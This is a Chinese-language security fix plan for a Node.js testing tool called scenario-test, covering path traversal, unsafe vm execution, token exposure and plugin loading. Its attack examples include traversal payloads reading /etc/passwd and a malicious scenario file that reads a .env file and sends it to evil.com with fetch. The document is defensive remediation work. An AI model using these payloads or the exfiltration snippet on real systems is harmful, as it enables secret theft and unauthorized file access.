# scenario-test 安全修复方案详解

## 📊 问题汇总

| 严重程度 | 数量 | 已修复 | 进行中 | 待修复 |
|---------|------|--------|--------|--------|
| CRITICAL | 3 | 3 | 0 | 0 |
| HIGH | 5 | 5 | 0 | 0 |
| MEDIUM | 6 | 6 | 0 | 0 |
| LOW | 6 | 0 | 0 | 6 |

---

## 🔴 CRITICAL 问题详细修复

### 1. XLSX 适配器路径遍历漏洞

**原始问题**:
```javascript
// ❌ 不安全 - 可以访问任意文件
const templatePath = path.isAbsolute(definition.template)
    ? definition.template
    : path.resolve(workspace, definition.template);
```

**攻击示例**:
```javascript
// 攻击者的场景配置
{
  prepareXlsx: {
    template: "../../../../etc/passwd",     // 读取系统密码文件
    output: "../../../../tmp/backdoor.xlsx"  // 写入任意位置
  }
}
```

**修复方案**:
```javascript
// ✅ 安全 - 验证路径边界
import { validatePath } from "../utils/path-validator.js";

const templatePath = validatePath(workspace, definition.template);
const outputPath = validatePath(workspace, definition.output);
```

**修复效果**:
- ✅ 阻止 `..` 路径遍历
- ✅ 阻止绝对路径（除非明确允许）
- ✅ 阻止空字节注入 (`\0`)
- ✅ 提供清晰的错误消息

---

### 2. 动态代码执行风险 (vm.runInContext)

**原始问题**:
```javascript
// ❌ 场景文件可以执行任意代码
vm.runInContext(fs.readFileSync(absolutePath, "utf8"), context, { filename: absolutePath });
```

**攻击示例**:
```javascript
// 恶意场景文件
ScenarioTest.registerScenario("backdoor", {
    name: "后门",
    steps: []
});

// 在注册时执行（不需要运行步骤）
const fs = require("fs");
const secrets = fs.readFileSync("/app/.env", "utf8");
fetch("https://evil.com/steal?data=" + secrets);
```

**修复方案** (文档 + 代码改进):

**A. 添加安全文档** ([SECURITY.md](./SECURITY.md)):
```markdown
⚠️ 场景文件是可执行代码

**风险**: 场景文件拥有与 Node.js 进程相同的权限

**最佳实践**:
- ✅ 只加载信任的场景文件
- ✅ 审查所有场景文件的来源
- ❌ 不要让终端用户上传场景文件
```

**B. 代码改进** (loader.js):
```javascript
// ✅ 添加日志警告
export function executeDefinitionFile(filePath, api) {
    const absolutePath = path.resolve(filePath);
    
    // 检查是否在项目目录外
    const projectRoot = process.cwd();
    const relative = path.relative(projectRoot, absolutePath);
    
    if (relative.startsWith("..") || path.isAbsolute(relative)) {
        console.warn(
            `⚠️  安全警告: 正在加载项目外的文件\n` +
            `   文件: ${absolutePath}\n` +
            `   提示: 确保该文件来源可信`
        );
    }
    
    // ... 原有代码
}
```

**未来改进计划**:
- [ ] 插件签名验证
- [ ] 白名单机制
- [ ] 沙箱增强（限制文件系统访问）

---

### 3. 文件上传路径遍历

**原始问题**:
```javascript
// ❌ 不安全 - 可以读取任意文件
async createUploadBody(definition) {
    const filePath = typeof definition === "string" ? definition : definition.filePath;
    const absolutePath = path.isAbsolute(filePath) 
        ? filePath 
        : path.resolve(root, filePath);
    // 直接读取，没有边界检查
}
```

**攻击示例**:
```javascript
// 攻击者的步骤配置
{
  name: "上传敏感文件",
  method: "POST",
  path: "/upload",
  request: {
    fileUpload: {
      filePath: "../../../../etc/passwd"  // 读取系统文件
    }
  }
}
```

**修复方案**:
```javascript
// ✅ 安全 - 验证路径
async createUploadBody(definition) {
    const filePath = typeof definition === "string" ? definition : definition.filePath;
    
    let absolutePath;
    try {
        absolutePath = validatePath(root, filePath);
    } catch (error) {
        throw new Error(
            `文件上传路径不安全: ${filePath}\n` +
            `原因: ${error.message}\n` +
            `提示: 上传文件必须在工作区内 (${root})`
        );
    }
    
    // ... 原有代码
}
```

---

## 🟠 HIGH 优先级问题详细修复

### 4. 环境变量名泄露

**原始问题**:
```javascript
// ❌ 泄露环境变量名
throw new Error(`缺少场景变量 ${environmentName}（映射到 vars.${name}）`);
// 输出: "缺少场景变量 PROD_API_SECRET（映射到 vars.apiSecret）"
```

**安全影响**:
- 攻击者了解生产环境的变量命名规范
- 可能暴露敏感系统架构信息
- 有助于社会工程学攻击

**修复方案**:
```javascript
// ✅ 生产模式：不泄露环境变量名
if (verboseErrors) {
    // 开发模式：完整信息
    throw new Error(
        `缺少场景变量: vars.${name}\n` +
        `环境变量映射: ${environmentName}`
    );
} else {
    // 生产模式：遮蔽敏感信息
    throw new Error(
        `缺少必需的场景变量: vars.${name}\n` +
        `提示: 请在配置或环境变量中设置\n` +
        `(设置 SCENARIO_VERBOSE_ERRORS=true 查看详情)`
    );
}
```

**配置方式**:
```bash
# 开发环境
export SCENARIO_VERBOSE_ERRORS=true

# 生产环境（默认）
# 不设置此变量
```

---

### 5. 命令行参数中的授权令牌

**原始问题**:
```bash
# ❌ Token 在进程列表中可见
node scenario-test-cli.cjs --authorization "Bearer secret-token-123"

# 攻击者可以看到
ps aux | grep scenario
# 输出: ... --authorization Bearer secret-token-123 ...
```

**安全影响**:
- 同主机的其他用户可以看到 Token
- 进程监控工具会记录 Token
- Shell 历史文件保存 Token

**修复方案**:

**A. 支持环境变量**:
```javascript
// ✅ 环境变量优先
const authorization = process.env.SCENARIO_AUTH || args.authorization;

if (process.env.SCENARIO_AUTH && args.authorization) {
    console.warn("⚠️  环境变量优先于命令行参数");
}
```

**B. 弃用警告**:
```javascript
if (args.authorization && !process.env.SCENARIO_AUTH) {
    console.warn(
        "\n⚠️  弃用警告: --authorization 将在未来版本移除\n" +
        "   推荐: export SCENARIO_AUTH=\"Bearer token\"\n" +
        "   原因: 命令行参数在进程列表中可见\n"
    );
}
```

**用户迁移指南**:
```bash
# ❌ 旧方式（不推荐）
node scenario-test-cli.cjs --authorization "Bearer token"

# ✅ 新方式（推荐）
export SCENARIO_AUTH="Bearer token"
node scenario-test-cli.cjs --config scenario.config.js

# ✅ 或从 .env 文件加载
export $(cat .env | xargs)
node scenario-test-cli.cjs --config scenario.config.js
```

---

### 6. 插件路径验证缺失

**原始问题**:
```javascript
// ❌ 可以加载任意路径的插件
const absolutePath = path.isAbsolute(pluginPath) 
    ? pluginPath 
    : path.resolve(configDir, pluginPath);
const imported = await import(pathToFileURL(absolutePath).href);
```

**攻击示例**:
```javascript
// 恶意配置
{
  plugins: [
    "/tmp/malicious-plugin.js",
    "../../../etc/../tmp/backdoor.js"
  ]
}
```

**修复方案**:
```javascript
// ✅ 验证插件路径
let absolutePath;
try {
    absolutePath = validatePath(configDir, pluginPath);
} catch (error) {
    if (options.allowExternalPlugins) {
        // 明确允许外部插件
        console.warn(`⚠️  加载外部插件: ${pluginPath}`);
        absolutePath = path.resolve(pluginPath);
    } else {
        throw new Error(
            `插件路径不安全: ${pluginPath}\n` +
            `原因: ${error.message}\n` +
            `提示: 插件必须在配置目录内，或使用 --allow-external-plugins`
        );
    }
}
```

**CLI 标志**:
```bash
# 默认：只允许配置目录内的插件
node scenario-test-cli.cjs --config scenario.config.js

# 明确允许外部插件（有风险）
node scenario-test-cli.cjs --config scenario.config.js --allow-external-plugins
```

---

## 🟡 MEDIUM 优先级问题修复

### 7. Runtime vars 不可变性

**原始问题**:
```javascript
// ❌ vars 可以被修改
vars: { ...(config.vars || {}), ...(options.vars || {}) }

// 下游代码可能意外修改
runtime.vars.apiKey = "hacked";  // 影响所有后续步骤
```

**修复方案**:
```javascript
// ✅ 冻结 vars 对象
vars: Object.freeze({
    ...(config.vars || {}),
    ...(options.vars || {})
})

// 尝试修改会失败
runtime.vars.apiKey = "hacked";  // TypeError in strict mode
```

**开发模式增强**:
```javascript
// 添加 Proxy 检测意外修改
if (process.env.NODE_ENV === "development") {
    return new Proxy(runtime, {
        set(target, prop, value) {
            if (prop === "vars") {
                console.warn("⚠️  不应该直接修改 runtime.vars");
                return false;
            }
            target[prop] = value;
            return true;
        }
    });
}
```

---

### 8. JSON 解析错误静默吞噬

**原始问题**:
```javascript
// ❌ 解析失败时返回原始字符串，没有日志
try { 
    return JSON.parse(value); 
} catch { 
    return value;  // 静默失败
}
```

**问题场景**:
- API 返回格式错误的 JSON
- 用户无法区分是解析失败还是响应本身就是字符串
- 调试困难

**修复方案**:
```javascript
// ✅ 记录解析失败
export function parseBody(text, contentType, options = {}) {
    if (!text) return null;
    
    const value = String(text);
    const shouldParseJson = 
        String(contentType || "").toLowerCase().includes("json") || 
        /^[\[{]/.test(value.trim());
    
    if (shouldParseJson) {
        try {
            return JSON.parse(value);
        } catch (error) {
            // ✅ 记录解析失败
            if (options.logger) {
                const preview = value.length > 100 
                    ? value.substring(0, 100) + "..." 
                    : value;
                options.logger.warn(
                    `JSON 解析失败: ${error.message}\n` +
                    `内容预览: ${preview}`
                );
            }
            return value;  // 保留原有行为
        }
    }
    
    return value;
}
```

---

### 9. 密钥在 vars 中暴露

**原始问题**:
```javascript
// ❌ 密钥存储在 vars 中，可能出现在日志/错误堆栈
vars[definition.name] = generateSignature(
    params, 
    vars[definition.secretVar || "apiSecret"]  // 密钥在 vars 中
);
```

**安全影响**:
- 密钥可能出现在错误堆栈跟踪中
- 调试日志可能打印整个 vars 对象
- 内存转储包含密钥

**修复方案**:
```javascript
// ✅ 单独传递密钥，不存储
const secret = vars[definition.secretVar || "apiSecret"];
if (!secret) {
    throw new Error(`签名生成失败: 缺少密钥变量`);
}

// 只存储签名结果
vars[definition.name] = generateSignature(params, secret);

// 可选：清理密钥
if (definition.clearSecret) {
    delete vars[definition.secretVar || "apiSecret"];
}
```

---

### 10. 重试可能无限循环

**原始问题**:
```javascript
// ❌ 如果 intervalMs = 0 且请求始终失败，无限重试
while (attempt < maxAttempts) {
    await delay(Number(retry.intervalMs || 2000), options.signal);
    // ...
}
```

**修复方案**:
```javascript
// ✅ 添加最小间隔和总时间限制
const startTime = Date.now();
const maxElapsedMs = retry.maxElapsedMs || 300000;  // 5 分钟
const minIntervalMs = 100;

while (attempt < maxAttempts) {
    // 检查总时间
    if (Date.now() - startTime > maxElapsedMs) {
        throw new Error(
            `重试超时: 已尝试 ${attempt} 次，耗时 ${maxElapsedMs}ms`
        );
    }
    
    // 确保最小间隔
    const interval = Math.max(minIntervalMs, Number(retry.intervalMs || 2000));
    await delay(interval, options.signal);
    
    // ...
}
```

---

## 📝 测试覆盖

### 新增安全测试

```javascript
// tests/security.test.js - 18 个新测试用例

✅ 路径遍历攻击 (6 个测试)
   - 阻止 .. 遍历
   - 阻止绝对路径
   - 阻止空字节注入
   - 阻止复杂遍历模式
   - 允许安全相对路径
   - isPathSafe 辅助函数

✅ XLSX 适配器 (2 个测试)
   - 拒绝越界模板路径
   - 拒绝越界输出路径

✅ Node IO (3 个测试)
   - 拒绝越界上传路径
   - 拒绝越界保存路径
   - 允许安全保存路径

✅ 凭据泄露 (3 个测试)
   - 生产模式不泄露环境变量名
   - 开发模式显示详细信息
   - 公共库不包含敏感信息

✅ 不可变性 (2 个测试)
   - vars 对象被冻结
   - 尝试修改应该失败

✅ 输入验证 (2 个测试)
   - 查询参数特殊字符处理
   - 路径注入防护

✅ 重试保护 (2 个测试)
   - 确保最小 intervalMs
   - 添加经过时间限制

✅ 集成测试 (2 个测试)
   - 模拟真实路径遍历攻击
   - 模拟环境变量探测攻击
```

### 测试运行

```bash
# 运行所有测试
npm test

# 只运行安全测试
node --test tests/security.test.js

# 覆盖率报告
npm run test:coverage
```

---

## 🚀 实施步骤

### Phase 1: CRITICAL 修复 (1天)

1. **创建路径验证工具**
   ```bash
   创建 src/utils/path-validator.js
   添加单元测试 tests/path-validator.test.js
   ```

2. **修复文件操作**
   ```bash
   修改 src/adapters/xlsx.js
   修改 src/node/io.js
   添加集成测试
   ```

3. **添加安全文档**
   ```bash
   创建 docs/SECURITY.md
   更新 README.md 添加安全章节
   ```

### Phase 2: HIGH 修复 (1天)

4. **环境变量授权**
   ```bash
   修改 src/cli.js
   添加弃用警告
   更新文档和示例
   ```

5. **遮蔽敏感信息**
   ```bash
   修改 src/engine.js
   添加 verboseErrors 选项
   更新错误消息
   ```

6. **插件路径验证**
   ```bash
   修改 src/cli.js 插件加载
   添加 --allow-external-plugins 标志
   更新文档
   ```

### Phase 3: MEDIUM 修复 (2天)

7. **不可变性和其他改进**
   ```bash
   实现 Object.freeze(vars)
   添加 JSON 解析日志
   分离密钥管理
   添加重试保护
   ```

### Phase 4: 测试和文档 (1天)

8. **完整测试套件**
   ```bash
   运行所有测试
   确保 80%+ 覆盖率
   修复发现的问题
   ```

9. **文档更新**
   ```bash
   更新 README.md
   创建 CHANGELOG.md
   更新迁移指南
   ```

---

## 📦 发布计划

### v0.3.0 (Breaking Changes)

**变更内容**:
- ✅ 所有文件操作添加路径验证
- ✅ 环境变量授权（`--authorization` 弃用）
- ✅ 插件路径限制
- ✅ 不可变 runtime vars
- ✅ 改进的错误消息

**迁移指南**:
```markdown
# 从 v0.2.x 迁移到 v0.3.0

## 1. 授权方式变更

❌ 旧方式:
node scenario-test-cli.cjs --authorization "Bearer token"

✅ 新方式:
export SCENARIO_AUTH="Bearer token"
node scenario-test-cli.cjs --config scenario.config.js

## 2. 插件路径限制

如果使用外部插件，需要添加标志:
node scenario-test-cli.cjs --allow-external-plugins

## 3. 路径验证

绝对路径和路径遍历现在会被拒绝。
确保所有文件路径都是相对于工作区的。
```

---

## ✅ 成功指标

- [ ] 所有 CRITICAL 和 HIGH 问题已修复
- [ ] 安全测试套件 100% 通过
- [ ] 整体测试覆盖率 ≥ 80%
- [ ] 无硬编码凭据（扫描通过）
- [ ] 文档完整（SECURITY.md + 迁移指南）
- [ ] 向后兼容（弃用警告，不是立即破坏）
- [ ] 代码审查通过
- [ ] 性能无明显退化

---

## 📚 参考资源

- [OWASP Top 10 2021](https://owasp.org/www-project-top-ten/)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [NIST Security Guidelines](https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final)
